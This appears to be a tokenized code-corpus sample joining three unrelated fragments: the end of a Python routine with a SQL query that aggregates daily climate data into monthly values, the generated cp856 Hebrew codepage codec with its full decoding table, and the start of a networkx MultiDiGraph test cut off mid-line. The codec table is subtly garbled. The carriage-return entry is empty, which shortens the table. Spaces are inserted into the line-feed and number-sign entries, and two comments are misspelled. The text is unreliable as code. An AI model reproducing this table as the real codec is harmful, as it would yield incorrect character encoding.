( x . count * ( x . mean ** 2 ) ) ) - ( ( x . count + y . count + z . count ) * ( mu_x_u_y_u_z ** 2 ) ) ) ) <newline>  # ▁ aggregate ▁ daily ▁ into ▁ monthly <encdom> <dedent>  """ <strnewline> INSERT ▁ INTO ▁"climate_sample_table_11" ▁ <strnewline> SELECT ▁ sub.place_id ▁ as ▁ place_id, ▁ <strnewline> ( <strnewline> ▁ ((sub.year-2011) ▁ * ▁ 12) ▁ + ▁ <strnewline> ▁ ((sub.month-1) ▁ - ▁ 10) <strnewline> ) ▁ as ▁ time_period, <strnewline> sub.value ▁ as ▁ value <strnewline> FROM ▁ ( <strnewline> ▁ SELECT ▁ place_id, ▁ <strnewline> ▁ Extract('month' ▁ from ▁ DATE('2011-11-11') ▁ + ▁ time_period) ▁ as ▁ month, ▁ <strnewline> ▁ Extract('year' ▁ from ▁ DATE('2011-11-11') ▁ + ▁ time_period) ▁ as ▁ year, <strnewline> ▁ AVG(value) ▁ as ▁ value <strnewline> ▁ FROM ▁ climate_sample_table_1 ▁ <strnewline> ▁ GROUP ▁ BY ▁ place_id, ▁ year, ▁ month <strnewline> ) ▁ AS ▁ sub <strnewline> """  <newline>
 """ ▁ Python ▁ Character ▁ Mapping ▁ Codec ▁ cp856 ▁ generated ▁ from ▁'MAPPINGS/VENDORS/MISC/CP856.TXT' ▁ with ▁ gencodec.py. <strnewline> <strnewline> """  <newline> import codecs <newline>  # # # ▁ Codec ▁ APIs <encdom> class Codec ( codecs . Codec ) : <newline> <indent> def encode ( self , input , errors = 'strict' ) : <newline> <indent> return codecs . charmap_encode ( input , errors , encoding_table ) <newline> <dedent> def decode ( self , input , errors = 'strict' ) : <newline> <indent> return codecs . charmap_decode ( input , errors , decoding_table ) <newline> <dedent> <dedent> class IncrementalEncoder ( codecs . IncrementalEncoder ) : <newline> <indent> def encode ( self , input , final = False ) : <newline> <indent> return codecs . charmap_encode ( input , self . errors , encoding_table ) [ 0 ] <newline> <dedent> <dedent> class IncrementalDecoder ( codecs . IncrementalDecoder ) : <newline> <indent> def decode ( self , input , final = False ) : <newline> <indent> return codecs . charmap_decode ( input , self . errors , decoding_table ) [ 0 ] <newline> <dedent> <dedent> class StreamWriter ( Codec , codecs . StreamWriter ) : <newline> <indent> pass <newline> <dedent> class StreamReader ( Codec , codecs . StreamReader ) : <newline> <indent> pass <newline>  # # # ▁ encodings ▁ module ▁ API <encdom> <dedent> def getregentry ( ) : <newline> <indent> return codecs . CodecInfo ( name = 'cp856' , encode = Codec ( ) . encode , decode = Codec ( ) . decode , incrementalencoder = IncrementalEncoder , incrementaldecoder = IncrementalDecoder , streamreader = StreamReader , streamwriter = StreamWriter , ) <newline>  # # # ▁ Decoding ▁ Table <encdom> <dedent> decoding_table = ( u'\x00'  # ▁ 0x00 ▁ -> ▁ NULL <encdom> u'\x01'  # ▁ 0x01 ▁ -> ▁ START ▁ OF ▁ HEADING <encdom> u'\x02'  # ▁ 0x02 ▁ -> ▁ START ▁ OF ▁ TEXT <encdom> u'\x03'  # ▁ 0x03 ▁ -> ▁ END ▁ OF ▁ TEXT <encdom> u'\x04'  # ▁ 0x04 ▁ -> ▁ END ▁ OF ▁ TRANSMISSION <encdom> u'\x05'  # ▁ 0x05 ▁ -> ▁ ENQUIRY <encdom> u'\x06'  # ▁ 0x06 ▁ -> ▁ ACKNOWLEDGE <encdom> u'\x07'  # ▁ 0x07 ▁ -> ▁ BELL <encdom> u'\x08'  # ▁ 0x08 ▁ -> ▁ BACKSPACE <encdom> u'\t'  # ▁ 0x09 ▁ -> ▁ HORIZONTAL ▁ TABULATION <encdom> u' \n '  # ▁ 0x0A ▁ -> ▁ LINE ▁ FEED <encdom> u'\x0b'  # ▁ 0x0B ▁ -> ▁ VERTICAL ▁ TABULATION <encdom> u'\x0c'  # ▁ 0x0C ▁ -> ▁ FORM ▁ FEED <encdom> u''  # ▁ 0x0D ▁ -> ▁ CARRIAGE ▁ RETURN <encdom> u'\x0e'  # ▁ 0x0E ▁ -> ▁ SHIFT ▁ OUT <encdom> u'\x0f'  # ▁ 0x0F ▁ -> ▁ SHIFT ▁ IN <encdom> u'\x10'  # ▁ 0x10 ▁ -> ▁ DATA ▁ LINK ▁ ESCAPE <encdom> u'\x11'  # ▁ 0x11 ▁ -> ▁ DEVICE ▁ CONTROL ▁ ONE <encdom> u'\x12'  # ▁ 0x12 ▁ -> ▁ DEVICE ▁ CONTROL ▁ TWO <encdom> u'\x13'  # ▁ 0x13 ▁ -> ▁ DEVICE ▁ CONTROL ▁ THREE <encdom> u'\x14'  # ▁ 0x14 ▁ -> ▁ DEVICE ▁ CONTROL ▁ FOUR <encdom> u'\x15'  # ▁ 0x15 ▁ -> ▁ NEGATIVE ▁ ACKNOWLEDGE <encdom> u'\x16'  # ▁ 0x16 ▁ -> ▁ SYNCHRONOUS ▁ IDLE <encdom> u'\x17'  # ▁ 0x17 ▁ -> ▁ END ▁ OF ▁ TRANSMISSION ▁ BLOCK <encdom> u'\x18'  # ▁ 0x18 ▁ -> ▁ CANCEL <encdom> u'\x19'  # ▁ 0x19 ▁ -> ▁ END ▁ OF ▁ MEDIUM <encdom> u'\x1a'  # ▁ 0x1A ▁ -> ▁ SUBSTITUTE <encdom> u'\x1b'  # ▁ 0x1B ▁ -> ▁ ESCAPE <encdom> u'\x1c'  # ▁ 0x1C ▁ -> ▁ FILE ▁ SEPARATOR <encdom> u'\x1d'  # ▁ 0x1D ▁ -> ▁ GROUP ▁ SEPARATOR <encdom> u'\x1e'  # ▁ 0x1E ▁ -> ▁ RECORD ▁ SEPARATOR <encdom> u'\x1f'  # ▁ 0x1F ▁ -> ▁ UNIT ▁ SEPARATOR <encdom> u' ▁ '  # ▁ 0x20 ▁ -> ▁ SPACE <encdom> u'!'  # ▁ 0x21 ▁ -> ▁ EXCLAMATION ▁ MARK <encdom> u'"'  # ▁ 0x22 ▁ -> ▁ QUOTATION ▁ MARK <encdom> u' # '  # ▁ 0x23 ▁ -> ▁ NUMBER ▁ SIGN <encdom> u'$'  # ▁ 0x24 ▁ -> ▁ DOLLAR ▁ SIGN <encdom> u'%'  # ▁ 0x25 ▁ -> ▁ PERCENT ▁ SIGN <encdom> u'&'  # ▁ 0x26 ▁ -> ▁ AMPERSAND <encdom> u"'"  # ▁ 0x27 ▁ -> ▁ APOSTROPHE <encdom> u'('  # ▁ 0x28 ▁ -> ▁ LEFT ▁ PARENTHESIS <encdom> u')'  # ▁ 0x29 ▁ -> ▁ RIGHT ▁ PARENTHESIS <encdom> u'*'  # ▁ 0x2A ▁ -> ▁ ASTERISK <encdom> u'+'  # ▁ 0x2B ▁ -> ▁ PLUS ▁ SIGN <encdom> u','  # ▁ 0x2C ▁ -> ▁ COMMA <encdom> u'-'  # ▁ 0x2D ▁ -> ▁ HYPHEN-MINUS <encdom> u'.'  # ▁ 0x2E ▁ -> ▁ FULL ▁ STOP <encdom> u'/'  # ▁ 0x2F ▁ -> ▁ SOLIDUS <encdom> u'0'  # ▁ 0x30 ▁ -> ▁ DIGIT ▁ ZERO <encdom> u'1'  # ▁ 0x31 ▁ -> ▁ DIGIT ▁ ONE <encdom> u'2'  # ▁ 0x32 ▁ -> ▁ DIGIT ▁ TWO <encdom> u'3'  # ▁ 0x33 ▁ -> ▁ DIGIT ▁ THREE <encdom> u'4'  # ▁ 0x34 ▁ -> ▁ DIGIT ▁ FOUR <encdom> u'5'  # ▁ 0x35 ▁ -> ▁ DIGIT ▁ FIVE <encdom> u'6'  # ▁ 0x36 ▁ -> ▁ DIGIT ▁ SIX <encdom> u'7'  # ▁ 0x37 ▁ -> ▁ DIGIT ▁ SEVEN <encdom> u'8'  # ▁ 0x38 ▁ -> ▁ DIGIT ▁ EIGHT <encdom> u'9'  # ▁ 0x39 ▁ -> ▁ DIGIT ▁ NINE <encdom> u':'  # ▁ 0x3A ▁ -> ▁ COLON <encdom> u';'  # ▁ 0x3B ▁ -> ▁ SEMICOLON <encdom> u'<'  # ▁ 0x3C ▁ -> ▁ LESS-THAN ▁ SIGN <encdom> u'='  # ▁ 0x3D ▁ -> ▁ EQUALS ▁ SIGN <encdom> u'>'  # ▁ 0x3E ▁ -> ▁ GREATER-THAN ▁ SIGN <encdom> u'?'  # ▁ 0x3F ▁ -> ▁ QUESTION ▁ MARK <encdom> u'@'  # ▁ 0x40 ▁ -> ▁ COMMERCIAL ▁ AT <encdom> u'A'  # ▁ 0x41 ▁ -> ▁ LATIN ▁ CAPITAL ▁ LETTER ▁ A <encdom> u'B'  # ▁ 0x42 ▁ -> ▁ LATIN ▁ CAPITAL ▁ LETTER ▁ B <encdom> u'C'  # ▁ 0x43 ▁ -> ▁ LATIN ▁ CAPITAL ▁ LETTER ▁ C <encdom> u'D'  # ▁ 0x44 ▁ -> ▁ LATIN ▁ CAPITAL ▁ LETTER ▁ D <encdom> u'E'  # ▁ 0x45 ▁ -> ▁ LATIN ▁ CAPITAL ▁ LETTER ▁ E <encdom> u'F'  # ▁ 0x46 ▁ -> ▁ LATIN ▁ CAPITAL ▁ LETTER ▁ F <encdom> u'G'  # ▁ 0x47 ▁ -> ▁ LATIN ▁ CAPITAL ▁ LETTER ▁ G <encdom> u'H'  # ▁ 0x48 ▁ -> ▁ LATIN ▁ CAPITAL ▁ LETTER ▁ H <encdom> u'I'  # ▁ 0x49 ▁ -> ▁ LATIN ▁ CAPITAL ▁ LETTER ▁ I <encdom> u'J'  # ▁ 0x4A ▁ -> ▁ LATIN ▁ CAPITAL ▁ LETTER ▁ J <encdom> u'K'  # ▁ 0x4B ▁ -> ▁ LATIN ▁ CAPITAL ▁ LETTER ▁ K <encdom> u'L'  # ▁ 0x4C ▁ -> ▁ LATIN ▁ CAPITAL ▁ LETTER ▁ L <encdom> u'M'  # ▁ 0x4D ▁ -> ▁ LATIN ▁ CAPITAL ▁ LETTER ▁ M <encdom> u'N'  # ▁ 0x4E ▁ -> ▁ LATIN ▁ CAPITAL ▁ LETTER ▁ N <encdom> u'O'  # ▁ 0x4F ▁ -> ▁ LATIN ▁ CAPITAL ▁ LETTER ▁ O <encdom> u'P'  # ▁ 0x50 ▁ -> ▁ LATIN ▁ CAPITAL ▁ LETTER ▁ P <encdom> u'Q'  # ▁ 0x51 ▁ -> ▁ LATIN ▁ CAPITAL ▁ LETTER ▁ Q <encdom> u'R'  # ▁ 0x52 ▁ -> ▁ LATIN ▁ CAPITAL ▁ LETTER ▁ R <encdom> u'S'  # ▁ 0x53 ▁ -> ▁ LATIN ▁ CAPITAL ▁ LETTER ▁ S <encdom> u'T'  # ▁ 0x54 ▁ -> ▁ LATIN ▁ CAPITAL ▁ LETTER ▁ T <encdom> u'U'  # ▁ 0x55 ▁ -> ▁ LATIN ▁ CAPITAL ▁ LETTER ▁ U <encdom> u'V'  # ▁ 0x56 ▁ -> ▁ LATIN ▁ CAPITAL ▁ LETTER ▁ V <encdom> u'W'  # ▁ 0x57 ▁ -> ▁ LATIN ▁ CAPITAL ▁ LETTER ▁ W <encdom> u'X'  # ▁ 0x58 ▁ -> ▁ LATIN ▁ CAPITAL ▁ LETTER ▁ X <encdom> u'Y'  # ▁ 0x59 ▁ -> ▁ LATIN ▁ CAPITAL ▁ LETTER ▁ Y <encdom> u'Z'  # ▁ 0x5A ▁ -> ▁ LATIN ▁ CAPITAL ▁ LETTER ▁ Z <encdom> u'['  # ▁ 0x5B ▁ -> ▁ LEFT ▁ SQUARE ▁ BRACKET <encdom> u'\\'  # ▁ 0x5C ▁ -> ▁ REVERSE ▁ SOLIDUS <encdom> u']'  # ▁ 0x5D ▁ -> ▁ RIGHT ▁ SQUARE ▁ BRACKET <encdom> u'^'  # ▁ 0x5E ▁ -> ▁ CIRCUMFLEX ▁ ACCENT <encdom> u'_'  # ▁ 0x5F ▁ -> ▁ LOW ▁ LINE <encdom> u'`'  # ▁ 0x60 ▁ -> ▁ GRAVE ▁ ACCENT <encdom> u'a'  # ▁ 0x61 ▁ -> ▁ LATIN ▁ SMALL ▁ LETTER ▁ A <encdom> u'b'  # ▁ 0x62 ▁ -> ▁ LATIN ▁ SMALL ▁ LETTER ▁ B <encdom> u'c'  # ▁ 0x63 ▁ -> ▁ LATIN ▁ SMALL ▁ LETTER ▁ C <encdom> u'd'  # ▁ 0x64 ▁ -> ▁ LATIN ▁ SMALL ▁ LETTER ▁ D <encdom> u'e'  # ▁ 0x65 ▁ -> ▁ LATIN ▁ SMALL ▁ LETTER ▁ E <encdom> u'f'  # ▁ 0x66 ▁ -> ▁ LATIN ▁ SMALL ▁ LETTER ▁ F <encdom> u'g'  # ▁ 0x67 ▁ -> ▁ LATIN ▁ SMALL ▁ LETTER ▁ G <encdom> u'h'  # ▁ 0x68 ▁ -> ▁ LATIN ▁ SMALL ▁ LETTER ▁ H <encdom> u'i'  # ▁ 0x69 ▁ -> ▁ LATIN ▁ SMALL ▁ LETTER ▁ I <encdom> u'j'  # ▁ 0x6A ▁ -> ▁ LATIN ▁ SMALL ▁ LETTER ▁ J <encdom> u'k'  # ▁ 0x6B ▁ -> ▁ LATIN ▁ SMALL ▁ LETTER ▁ K <encdom> u'l'  # ▁ 0x6C ▁ -> ▁ LATIN ▁ SMALL ▁ LETTER ▁ L <encdom> u'm'  # ▁ 0x6D ▁ -> ▁ LATIN ▁ SMALL ▁ LETTER ▁ M <encdom> u'n'  # ▁ 0x6E ▁ -> ▁ LATIN ▁ SMALL ▁ LETTER ▁ N <encdom> u'o'  # ▁ 0x6F ▁ -> ▁ LATIN ▁ SMALL ▁ LETTER ▁ O <encdom> u'p'  # ▁ 0x70 ▁ -> ▁ LATIN ▁ SMALL ▁ LETTER ▁ P <encdom> u'q'  # ▁ 0x71 ▁ -> ▁ LATIN ▁ SMALL ▁ LETTER ▁ Q <encdom> u'r'  # ▁ 0x72 ▁ -> ▁ LATIN ▁ SMALL ▁ LETTER ▁ R <encdom> u's'  # ▁ 0x73 ▁ -> ▁ LATIN ▁ SMALL ▁ LETTER ▁ S <encdom> u't'  # ▁ 0x74 ▁ -> ▁ LATIN ▁ SMALL ▁ LETTER ▁ T <encdom> u'u'  # ▁ 0x75 ▁ -> ▁ LATIN ▁ SMALL ▁ LETTER ▁ U <encdom> u'v'  # ▁ 0x76 ▁ -> ▁ LATIN ▁ SMALL ▁ LETTER ▁ V <encdom> u'w'  # ▁ 0x77 ▁ -> ▁ LATIN ▁ SMALL ▁ LETTER ▁ W <encdom> u'x'  # ▁ 0x78 ▁ -> ▁ LATIN ▁ SMALL ▁ LETTER ▁ X <encdom> u'y'  # ▁ 0x79 ▁ -> ▁ LATIN ▁ SMALL ▁ LETTER ▁ Y <encdom> u'z'  # ▁ 0x7A ▁ -> ▁ LATIN ▁ SMALL ▁ LETTER ▁ Z <encdom> u'{'  # ▁ 0x7B ▁ -> ▁ LEFT ▁ CURLY ▁ BRACKET <encdom> u'|'  # ▁ 0x7C ▁ -> ▁ VERTICAL ▁ LINE <encdom> u'}'  # ▁ 0x7D ▁ -> ▁ RIGHT ▁ CURLY ▁ BRACKET <encdom> u'~'  # ▁ 0x7E ▁ -> ▁ TILDE <encdom> u'\x7f'  # ▁ 0x7F ▁ -> ▁ DELETE <encdom> u'\u05d0'  # ▁ 0x80 ▁ -> ▁ HEBREW ▁ LETTER ▁ ALEF <encdom> u'\u05d1'  # ▁ 0x81 ▁ -> ▁ HEBREW ▁ LETTER ▁ BET <encdom> u'\u05d2'  # ▁ 0x82 ▁ -> ▁ HEBREW ▁ LETTER ▁ GIMEL <encdom> u'\u05d3'  # ▁ 0x83 ▁ -> ▁ HEBREW ▁ LETTER ▁ DALET <encdom> u'\u05d4'  # ▁ 0x84 ▁ -> ▁ HEBREW ▁ LETTER ▁ HE <encdom> u'\u05d5'  # ▁ 0x85 ▁ -> ▁ HEBREW ▁ LETTER ▁ VAV <encdom> u'\u05d6'  # ▁ 0x86 ▁ -> ▁ HEBREW ▁ LETTER ▁ ZAYIN <encdom> u'\u05d7'  # ▁ 0x87 ▁ -> ▁ HEBREW ▁ LETTER ▁ HET <encdom> u'\u05d8'  # ▁ 0x88 ▁ -> ▁ HEBREW ▁ LETTER ▁ TET <encdom> u'\u05d9'  # ▁ 0x89 ▁ -> ▁ HEBREW ▁ LETTER ▁ YOD <encdom> u'\u05da'  # ▁ 0x8A ▁ -> ▁ HEBREW ▁ LETTER ▁ FINAL ▁ KAF <encdom> u'\u05db'  # ▁ 0x8B ▁ -> ▁ HEBREW ▁ LETTER ▁ KAF <encdom> u'\u05dc'  # ▁ 0x8C ▁ -> ▁ HEBREW ▁ LETTER ▁ LAMED <encdom> u'\u05dd'  # ▁ 0x8D ▁ -> ▁ HEBREW ▁ LETTER ▁ FINAL ▁ MEM <encdom> u'\u05de'  # ▁ 0x8E ▁ -> ▁ HEBREW ▁ LETTER ▁ MEM <encdom> u'\u05df'  # ▁ 0x8F ▁ -> ▁ HEBREW ▁ LETTER ▁ FINAL ▁ NUN <encdom> u'\u05e0'  # ▁ 0x90 ▁ -> ▁ HEBREW ▁ LETTER ▁ NUN <encdom> u'\u05e1'  # ▁ 0x91 ▁ -> ▁ HEBREW ▁ LETTER ▁ SAMEKH <encdom> u'\u05e2'  # ▁ 0x92 ▁ -> ▁ HEBREW ▁ LETTER ▁ AYIN <encdom> u'\u05e3'  # ▁ 0x93 ▁ -> ▁ HEBREW ▁ LETTER ▁ FINAL ▁ PE <encdom> u'\u05e4'  # ▁ 0x94 ▁ -> ▁ HEBREW ▁ LETTER ▁ PE <encdom> u'\u05e5'  # ▁ 0x95 ▁ -> ▁ HEBREW ▁ LETTER ▁ FINAL ▁ TSADI <encdom> u'\u05e6'  # ▁ 0x96 ▁ -> ▁ HEBREW ▁ LETTER ▁ TSADI <encdom> u'\u05e7'  # ▁ 0x97 ▁ -> ▁ HEBREW ▁ LETTER ▁ QOF <encdom> u'\u05e8'  # ▁ 0x98 ▁ -> ▁ HEBREW ▁ LETTER ▁ RESH <encdom> u'\u05e9'  # ▁ 0x99 ▁ -> ▁ HEBREW ▁ LETTER ▁ SHIN <encdom> u'\u05ea'  # ▁ 0x9A ▁ -> ▁ HEBREW ▁ LETTER ▁ TAV <encdom> u'\ufffe'  # ▁ 0x9B ▁ -> ▁ UNDEFINED <encdom> u'\xa3'  # ▁ 0x9C ▁ -> ▁ POUND ▁ SIGN <encdom> u'\ufffe'  # ▁ 0x9D ▁ -> ▁ UNDEFINED <encdom> u'\xd7'  # ▁ 0x9E ▁ -> ▁ MULTIPLICATION ▁ SIGN <encdom> u'\ufffe'  # ▁ 0x9F ▁ -> ▁ UNDEFINED <encdom> u'\ufffe'  # ▁ 0xA0 ▁ -> ▁ UNDEFINED <encdom> u'\ufffe'  # ▁ 0xA1 ▁ -> ▁ UNDEFINED <encdom> u'\ufffe'  # ▁ 0xA2 ▁ -> ▁ UNDEFINED <encdom> u'\ufffe'  # ▁ 0xA3 ▁ -> ▁ UNDEFINED <encdom> u'\ufffe'  # ▁ 0xA4 ▁ -> ▁ UNDEFINED <encdom> u'\ufffe'  # ▁ 0xA5 ▁ -> ▁ UNDEFINED <encdom> u'\ufffe'  # ▁ 0xA6 ▁ -> ▁ UNDEFINED <encdom> u'\ufffe'  # ▁ 0xA7 ▁ -> ▁ UNDEFINED <encdom> u'\ufffe'  # ▁ 0xA8 ▁ -> ▁ UNDEFINED <encdom> u'\xae'  # ▁ 0xA9 ▁ -> ▁ REGISTERED ▁ SIGN <encdom> u'\xac'  # ▁ 0xAA ▁ -> ▁ NOT ▁ SIGN <encdom> u'\xbd'  # ▁ 0xAB ▁ -> ▁ VULGAR ▁ FRACTION ▁ ONE ▁ HALF <encdom> u'\xbc'  # ▁ 0xAC ▁ -> ▁ VULGAR ▁ FRACTION ▁ ONE ▁ QUARTER <encdom> u'\ufffe'  # ▁ 0xAD ▁ -> ▁ UNDEFINED <encdom> u'\xab'  # ▁ 0xAE ▁ -> ▁ LEFT-POINTING ▁ DOUBLE ▁ ANGLE ▁ QUOTATION ▁ MARK <encdom> u'\xbb'  # ▁ 0xAF ▁ -> ▁ RIGHT-POINTING ▁ DOUBLE ▁ ANGLE ▁ QUOTATION ▁ MARK <encdom> u'\u2591'  # ▁ 0xB0 ▁ -> ▁ LIGHT ▁ SHADE <encdom> u'\u2592'  # ▁ 0xB1 ▁ -> ▁ MEDIUM ▁ SHADE <encdom> u'\u2593'  # ▁ 0xB2 ▁ -> ▁ DARK ▁ SHADE <encdom> u'\u2502'  # ▁ 0xB3 ▁ -> ▁ BOX ▁ DRAWINGS ▁ LIGHT ▁ VERTICAL <encdom> u'\u2524'  # ▁ 0xB4 ▁ -> ▁ BOX ▁ DRAWINGS ▁ LIGHT ▁ VERTICAL ▁ AND ▁ LEFT <encdom> u'\ufffe'  # ▁ 0xB5 ▁ -> ▁ UNDEFINED <encdom> u'\ufffe'  # ▁ 0xB6 ▁ -> ▁ UNDEFINED <encdom> u'\ufffe'  # ▁ 0xB7 ▁ -> ▁ UNDEFINED <encdom> u'\xa9'  # ▁ 0xB8 ▁ -> ▁ COPYRIGHT ▁ SIGN <encdom> u'\u2563'  # ▁ 0xB9 ▁ -> ▁ BOX ▁ DRAWINGS ▁ DOUBLE ▁ VERTICAL ▁ AND ▁ LEFT <encdom> u'\u2551'  # ▁ 0xBA ▁ -> ▁ BOX ▁ DRAWINGS ▁ DOUBLE ▁ VERTICAL <encdom> u'\u2557'  # ▁ 0xBB ▁ -> ▁ BOX ▁ DRAWINGS ▁ DOUBLE ▁ DOWN ▁ AND ▁ LEFT <encdom> u'\u255d'  # ▁ 0xBC ▁ -> ▁ BOX ▁ DRAWINGS ▁ DOUBLE ▁ UP ▁ AND ▁ LEFT <encdom> u'\xa2'  # ▁ 0xBD ▁ -> ▁ CENT ▁ SIGN <encdom> u'\xa5'  # ▁ 0xBE ▁ -> ▁ YEN ▁ SIGN <encdom> u'\u2510'  # ▁ 0xBF ▁ -> ▁ BOX ▁ DRAWINGS ▁ LIGHT ▁ DOWN ▁ AND ▁ LEFT <encdom> u'\u2514'  # ▁ 0xC0 ▁ -> ▁ BOX ▁ DRAWINGS ▁ LIGHT ▁ UP ▁ AND ▁ RIGHT <encdom> u'\u2534'  # ▁ 0xC1 ▁ -> ▁ BOX ▁ DRAWINGS ▁ LIGHT ▁ UP ▁ AND ▁ HORIZONTAL <encdom> u'\u252c'  # ▁ 0xC2 ▁ -> ▁ BOX ▁ DRAWINGS ▁ LIGHT ▁ DOWN ▁ AND ▁ HORIZONTAL <encdom> u'\u251c'  # ▁ 0xC3 ▁ -> ▁ BOX ▁ DRAWINGS ▁ LIGHT ▁ VERTICAL ▁ AND ▁ RIGHT <encdom> u'\u2500'  # ▁ 0xC4 ▁ -> ▁ BOX ▁ DRAWINGS ▁ LIGHT ▁ HORIZONTAL <encdom> u'\u253c'  # ▁ 0xC5 ▁ -> ▁ BOX ▁ DRAWINGS ▁ LIGHT ▁ VERTICAL ▁ AND ▁ HORIZONTAL <encdom> u'\ufffe'  # ▁ 0xC6 ▁ -> ▁ UNDEFINED <encdom> u'\ufffe'  # ▁ 0xC7 ▁ -> ▁ UNDEFINED <encdom> u'\u255a'  # ▁ 0xC8 ▁ -> ▁ BOX ▁ DRAWINGS ▁ DOUBLE ▁ UP ▁ AND ▁ RIGHT <encdom> u'\u2554'  # ▁ 0xC9 ▁ -> ▁ BOX ▁ DRAWINGS ▁ DOUBLE ▁ DOWN ▁ AND ▁ RIGHT <encdom> u'\u2569'  # ▁ 0xCA ▁ -> ▁ BOX ▁ DRAWINGS ▁ DOUBLE ▁ UP ▁ AND ▁ HORIZONTAL <encdom> u'\u2566'  # ▁ 0xCB ▁ -> ▁ BOX ▁ DRAWINGS ▁ DOUBLE ▁ DOWN ▁ AND ▁ HORIZONTAL <encdom> u'\u2560'  # ▁ 0xCC ▁ -> ▁ BOX ▁ DRAWINGS ▁ DOUBLE ▁ VERTICAL ▁ AND ▁ RIGHT <encdom> u'\u2550'  # ▁ 0xCD ▁ -> ▁ BOX ▁ DRAWINGS ▁ DOUBLE ▁ HORIZONTAL <encdom> u'\u256c'  # ▁ 0xCE ▁ -> ▁ BOX ▁ DRAWINGS ▁ DOUBLE ▁ VERTICAL ▁ AND ▁ HORIZONTAL <encdom> u'\xa4'  # ▁ 0xCF ▁ -> ▁ CURRENCY ▁ SIGN <encdom> u'\ufffe'  # ▁ 0xD0 ▁ -> ▁ UNDEFINED <encdom> u'\ufffe'  # ▁ 0xD1 ▁ -> ▁ UNDEFINED <encdom> u'\ufffe'  # ▁ 0xD2 ▁ -> ▁ UNDEFINED <encdom> u'\ufffe'  # ▁ 0xD3 ▁ -> ▁ UNDEFINEDS <encdom> u'\ufffe'  # ▁ 0xD4 ▁ -> ▁ UNDEFINED <encdom> u'\ufffe'  # ▁ 0xD5 ▁ -> ▁ UNDEFINED <encdom> u'\ufffe'  # ▁ 0xD6 ▁ -> ▁ UNDEFINEDE <encdom> u'\ufffe'  # ▁ 0xD7 ▁ -> ▁ UNDEFINED <encdom> u'\ufffe'  # ▁ 0xD8 ▁ -> ▁ UNDEFINED <encdom> u'\u2518'  # ▁ 0xD9 ▁ -> ▁ BOX ▁ DRAWINGS ▁ LIGHT ▁ UP ▁ AND ▁ LEFT <encdom> u'\u250c'  # ▁ 0xDA ▁ -> ▁ BOX ▁ DRAWINGS ▁ LIGHT ▁ DOWN ▁ AND ▁ RIGHT <encdom> u'\u2588'  # ▁ 0xDB ▁ -> ▁ FULL ▁ BLOCK <encdom> u'\u2584'  # ▁ 0xDC ▁ -> ▁ LOWER ▁ HALF ▁ BLOCK <encdom> u'\xa6'  # ▁ 0xDD ▁ -> ▁ BROKEN ▁ BAR <encdom> u'\ufffe'  # ▁ 0xDE ▁ -> ▁ UNDEFINED <encdom> u'\u2580'  # ▁ 0xDF ▁ -> ▁ UPPER ▁ HALF ▁ BLOCK <encdom> u'\ufffe'  # ▁ 0xE0 ▁ -> ▁ UNDEFINED <encdom> u'\ufffe'  # ▁ 0xE1 ▁ -> ▁ UNDEFINED <encdom> u'\ufffe'  # ▁ 0xE2 ▁ -> ▁ UNDEFINED <encdom> u'\ufffe'  # ▁ 0xE3 ▁ -> ▁ UNDEFINED <encdom> u'\ufffe'  # ▁ 0xE4 ▁ -> ▁ UNDEFINED <encdom> u'\ufffe'  # ▁ 0xE5 ▁ -> ▁ UNDEFINED <encdom> u'\xb5'  # ▁ 0xE6 ▁ -> ▁ MICRO ▁ SIGN <encdom> u'\ufffe'  # ▁ 0xE7 ▁ -> ▁ UNDEFINED <encdom> u'\ufffe'  # ▁ 0xE8 ▁ -> ▁ UNDEFINED <encdom> u'\ufffe'  # ▁ 0xE9 ▁ -> ▁ UNDEFINED <encdom> u'\ufffe'  # ▁ 0xEA ▁ -> ▁ UNDEFINED <encdom> u'\ufffe'  # ▁ 0xEB ▁ -> ▁ UNDEFINED <encdom> u'\ufffe'  # ▁ 0xEC ▁ -> ▁ UNDEFINED <encdom> u'\ufffe'  # ▁ 0xED ▁ -> ▁ UNDEFINED <encdom> u'\xaf'  # ▁ 0xEE ▁ -> ▁ MACRON <encdom> u'\xb4'  # ▁ 0xEF ▁ -> ▁ ACUTE ▁ ACCENT <encdom> u'\xad'  # ▁ 0xF0 ▁ -> ▁ SOFT ▁ HYPHEN <encdom> u'\xb1'  # ▁ 0xF1 ▁ -> ▁ PLUS-MINUS ▁ SIGN <encdom> u'\u2017'  # ▁ 0xF2 ▁ -> ▁ DOUBLE ▁ LOW ▁ LINE <encdom> u'\xbe'  # ▁ 0xF3 ▁ -> ▁ VULGAR ▁ FRACTION ▁ THREE ▁ QUARTERS <encdom> u'\xb6'  # ▁ 0xF4 ▁ -> ▁ PILCROW ▁ SIGN <encdom> u'\xa7'  # ▁ 0xF5 ▁ -> ▁ SECTION ▁ SIGN <encdom> u'\xf7'  # ▁ 0xF6 ▁ -> ▁ DIVISION ▁ SIGN <encdom> u'\xb8'  # ▁ 0xF7 ▁ -> ▁ CEDILLA <encdom> u'\xb0'  # ▁ 0xF8 ▁ -> ▁ DEGREE ▁ SIGN <encdom> u'\xa8'  # ▁ 0xF9 ▁ -> ▁ DIAERESIS <encdom> u'\xb7'  # ▁ 0xFA ▁ -> ▁ MIDDLE ▁ DOT <encdom> u'\xb9'  # ▁ 0xFB ▁ -> ▁ SUPERSCRIPT ▁ ONE <encdom> u'\xb3'  # ▁ 0xFC ▁ -> ▁ SUPERSCRIPT ▁ THREE <encdom> u'\xb2'  # ▁ 0xFD ▁ -> ▁ SUPERSCRIPT ▁ TWO <encdom> u'\u25a0'  # ▁ 0xFE ▁ -> ▁ BLACK ▁ SQUARE <encdom> u'\xa0'  # ▁ 0xFF ▁ -> ▁ NO-BREAK ▁ SPACE <encdom> ) <newline>  # # # ▁ Encoding ▁ table <encdom> encoding_table = codecs . charmap_build ( decoding_table ) <newline>
 # !/usr/bin/env ▁ python <encdom> from nose . tools import * <newline> import networkx <newline> from test_multigraph import BaseMultiGraphTester , TestMultiGraph <newline> class BaseMultiDiGraphTester ( BaseMultiGraphTester ) : <newline> <indent> def test_edges ( self ) : <newline> <indent> G = self . K3 <newline> assert_equal ( sorted ( G . edges ( ) ) , [ ( 0 , 1 ) , ( 0 , 2 ) , ( 1 , 0 ) , ( 1 , 2 ) , ( 2 , 0 ) , ( 2 , 1 ) ] ) <newline> assert_equal ( sorted ( G . edges ( 0 ) ) , [ ( 0 , 1 ) , ( 0 , 2 ) ] ) <newline> assert_raises ( ( KeyError , networkx . NetworkXError ) , G . edges , - 1 ) <newline> <dedent> def test_edges_data ( self ) : <newline> <indent> G = self . K3 <newline> assert_equal ( sorted ( G . edges ( data = True ) ) , [ ( 0 , 1 , { } ) , ( 0 , 2 , { } ) , ( 1 , 